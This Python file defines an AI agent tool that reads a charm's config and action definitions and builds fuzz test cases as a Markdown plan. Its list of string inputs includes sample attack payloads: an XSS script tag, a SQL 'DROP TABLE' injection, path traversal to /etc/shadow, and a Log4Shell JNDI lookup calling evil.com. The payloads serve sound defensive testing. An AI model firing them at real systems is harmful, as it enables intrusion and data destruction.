"""Fuzz testing tool — generates randomised charm test inputs."""

import random
import string
from typing import Any

import yaml

from cantrip.agent.tools.base import Tool, ToolResult

# Maximum number of fuzz cases to generate per category.
_MAX_CASES = 10

# Characters used for random string generation.
_FUZZ_CHARS = string.ascii_letters + string.digits + string.punctuation + " \t\n"

# Value generators for different config types.
_FUZZ_VALUES: dict[str, list[object]] = {
    "string": [
        "",
        " ",
        "a" * 1000,
        "<script>alert(1)</script>",
        "'; DROP TABLE charms; --",
        "\x00\x01\x02",
        "日本語テスト",
        "/etc/passwd",
        "${jndi:ldap://evil.com}",
        "../../../etc/shadow",
    ],
    "int": [0, -1, 1, 2**31, -(2**31), 2**63, 999999999],
    "float": [0.0, -1.0, float("inf"), float("-inf"), 1e308, 1e-308],
    "boolean": [True, False],
}


def _random_string(max_length: int = 200) -> str:
    """Generate a random string of variable length."""
    length = random.randint(0, max_length)
    return "".join(random.choice(_FUZZ_CHARS) for _ in range(length))


def _fuzz_config_values(
    config: dict[str, Any],
) -> list[dict[str, object]]:
    """Generate fuzz test cases for charm config options.

    Each test case is a dict mapping config keys to randomised values
    appropriate to (or deliberately mismatched with) their declared type.
    """
    cases: list[dict[str, object]] = []
    options = config.get("options", {})
    if not options:
        return cases

    for _ in range(_MAX_CASES):
        case: dict[str, object] = {}
        for key, spec in options.items():
            opt_type = spec.get("type", "string")
            # Pick a value — sometimes from the right type, sometimes wrong.
            if random.random() < 0.7:
                # Correct type, unusual value.
                values = _FUZZ_VALUES.get(opt_type, _FUZZ_VALUES["string"])
                case[key] = random.choice(values)
            else:
                # Wrong type to test validation.
                case[key] = _random_string(50)
        cases.append(case)

    return cases


def _fuzz_action_params(
    actions: dict[str, Any],
) -> list[dict[str, object]]:
    """Generate fuzz test cases for charm action parameters.

    Each test case is a dict with action name and randomised params.
    """
    cases: list[dict[str, object]] = []

    for action_name, action_spec in actions.items():
        if not isinstance(action_spec, dict):
            continue
        params = action_spec.get("params", action_spec.get("parameters", {}))
        if not isinstance(params, dict):
            continue

        for _ in range(min(3, _MAX_CASES)):
            fuzzed_params: dict[str, object] = {}
            properties = params.get("properties", {})
            for param_name, param_spec in properties.items():
                if not isinstance(param_spec, dict):
                    continue
                param_type = param_spec.get("type", "string")
                values = _FUZZ_VALUES.get(param_type, _FUZZ_VALUES["string"])
                fuzzed_params[param_name] = random.choice(values)

            cases.append(
                {
                    "action": action_name,
                    "params": fuzzed_params,
                }
            )

    return cases


def _format_fuzz_report(
    config_cases: list[dict[str, object]],
    action_cases: list[dict[str, object]],
    config_options: dict[str, Any],
) -> str:
    """Format a fuzz test plan as Markdown."""
    lines = ["# Fuzz Test Plan", ""]

    lines.append(
        f"Generated {len(config_cases)} config fuzz cases and "
        f"{len(action_cases)} action fuzz cases."
    )
    lines.append("")

    if config_cases:
        lines.append("## Config Fuzz Cases")
        lines.append("")
        lines.append(f"Options under test: {', '.join(config_options.get('options', {}).keys())}")
        lines.append("")
        for i, case in enumerate(config_cases, 1):
            lines.append(f"### Case {i}")
            lines.append("")
            for key, value in case.items():
                lines.append(f"- `{key}`: `{value!r}`")
            lines.append("")

    if action_cases:
        lines.append("## Action Fuzz Cases")
        lines.append("")
        for i, case in enumerate(action_cases, 1):
            lines.append(f"### Case {i}: {case['action']}")
            lines.append("")
            params = case.get("params", {})
            if isinstance(params, dict):
                for key, value in params.items():
                    lines.append(f"- `{key}`: `{value!r}`")
            lines.append("")

    if not config_cases and not action_cases:
        lines.append("No config options or actions found to fuzz.")
        lines.append("")

    return "\n".join(lines)


class FuzzTestTool(Tool):
    """Tool to generate randomised test inputs for charm config and actions."""

    @property
    def name(self) -> str:
        return "fuzz_charm"

    @property
    def description(self) -> str:
        return (
            "Generate randomised test inputs for a charm's config options and "
            "actions. Reads charmcraft.yaml (or config.yaml + actions.yaml) to "
            "discover parameters, then produces fuzz test cases with boundary "
            "values, type mismatches, injection strings, and edge cases. "
            "Use the output to write Scenario unit tests or run Jubilant "
            "integration tests with adversarial inputs."
        )

    @property
    def parameters(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the charm directory",
                    "default": ".",
                },
                "seed": {
                    "type": "integer",
                    "description": (
                        "Random seed for reproducible fuzz generation (default: random)"
                    ),
                },
            },
        }

    async def execute(
        self,
        path: str = ".",
        seed: int | None = None,
    ) -> ToolResult:
        """Generate fuzz test cases for a charm."""
        import pathlib

        charm_dir = pathlib.Path(path).resolve()
        if not charm_dir.is_dir():
            return ToolResult(
                success=False,
                output="",
                error=f"Path not found: {path}",
            )

        if seed is not None:
            random.seed(seed)

        # Load config options.
        config: dict[str, Any] = {}
        charmcraft = charm_dir / "charmcraft.yaml"
        config_yaml = charm_dir / "config.yaml"
        if charmcraft.exists():
            try:
                with charmcraft.open() as f:
                    data = yaml.safe_load(f) or {}
                if "config" in data:
                    config = data["config"]
            except (yaml.YAMLError, OSError):
                pass
        if not config and config_yaml.exists():
            try:
                with config_yaml.open() as f:
                    config = yaml.safe_load(f) or {}
            except (yaml.YAMLError, OSError):
                pass

        # Load actions.
        actions: dict[str, Any] = {}
        if charmcraft.exists():
            try:
                with charmcraft.open() as f:
                    data = yaml.safe_load(f) or {}
                if "actions" in data:
                    actions = data["actions"]
            except (yaml.YAMLError, OSError):
                pass
        actions_yaml = charm_dir / "actions.yaml"
        if not actions and actions_yaml.exists():
            try:
                with actions_yaml.open() as f:
                    actions = yaml.safe_load(f) or {}
            except (yaml.YAMLError, OSError):
                pass

        config_cases = _fuzz_config_values(config)
        action_cases = _fuzz_action_params(actions)
        report = _format_fuzz_report(config_cases, action_cases, config)

        return ToolResult(
            success=True,
            output=report,
            data={
                "config_cases": len(config_cases),
                "action_cases": len(action_cases),
                "config_fuzz": config_cases,
                "action_fuzz": action_cases,
            },
            caption=f"{len(config_cases)} config cases, {len(action_cases)} action cases",
        )
